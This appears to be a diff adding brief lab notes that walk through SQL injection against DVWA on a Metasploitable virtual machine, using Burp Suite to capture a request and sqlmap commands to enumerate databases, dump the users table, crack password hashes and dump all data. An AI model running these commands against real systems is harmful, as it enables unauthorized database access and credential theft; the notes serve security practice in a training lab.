@@ -1,0 +1,29 @@
+=>launch metasploitable , enter the ip in the parrot os firefox browser, open dvwa, username -admin , password-password
+
+1)set the dvwa security to medium
+
+2)open burpsuite -> intercept on ->  open browser -> enter the ip address of metaspoilt -> 
+
+click on dvwa -> forward request -> right click the request -> do it till the command 1 on sql i -> save file as sql.txt
+
+3)open the folder where u saved it 
+
+->sqlmap -r sql.txt --dbs
+
+->press y -> y -> n
+
+->now u will be able to see the available databases
+
+4)sqlmap -r sql.txt -D dvwa --tables
+
+5)sqlmap -r sql.txt -D dvwa -T users --columns
+
+6)sqlmap -r sql.txt -D dvwa -T users -C user,password --dump 
+
+press n-> y -> press enter -> n
+
+now it will crack the hashes -> user table , password table and cracked passwords
+
+7)man sqlmap
+
+8)sqlmap -r sql.txt --dump-all
